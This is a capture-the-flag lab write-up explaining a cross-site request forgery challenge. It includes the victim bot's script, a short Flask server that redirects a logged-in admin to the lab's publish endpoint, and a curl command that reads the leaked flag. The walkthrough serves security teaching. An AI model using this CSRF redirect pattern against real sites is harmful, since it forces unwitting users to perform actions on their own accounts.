# Cross Site Request Forgery 1

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

Let's think about why the previous attacks against the victim worked. When the victim went into the website, they read the blog post that a malicious attacker
placed. We were able to inject javascript to make the victim make HTTP requests.

But what if there is no HTML to inject our payload into? Can we somehow still make the victim make arbritrary HTTP requests?

Yep!

In these next challenges, the server has shut down the ability for the `admin` to read posts.

Let's take a look at what the `/challenge/victim` does.

```python
browser.get(challenge_url)

print("Logging in as admin...")
browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(flag)
browser.find_element(By.NAME, "submit").submit()
print("Logged in!")

print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
browser.get("http://hacker.localhost:1337/")
```

Our victim logs in to `http.//challenge.localhost/` with their admin credentials. then, it visits the site `http://hacker.localhost:1337/`.

Right now, we don't need to think about how to make the victim actually go to this site, just that the victim does right now.

Therefore, our goal here is to spin up our server at that port. We want this server to redirect the `admin` to
`http://challenge.localhost:80/publish`, so it can publish the `flag` post that it has in their draft. 


Here is what our `malicious_server.py` will look like:
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/")
def home():
        return redirect("http://challenge.localhost:80/publish", code=302)

app.run(port=1337)
```

Since we have seen `flask` servers used throughout this lab many times, it should be easy to follow this.

We simply run this using `python malicious_server.py` to get a server running on port 1337. Then, we call `/challenge/victim`.

Now, let's login as a normal user to see what the flag is!

```bash
curl -c cookies 'http://challenge.localhost/login' -d "username=guest" -d "password=password" -L
```

And there you go! We get the flag in the html response!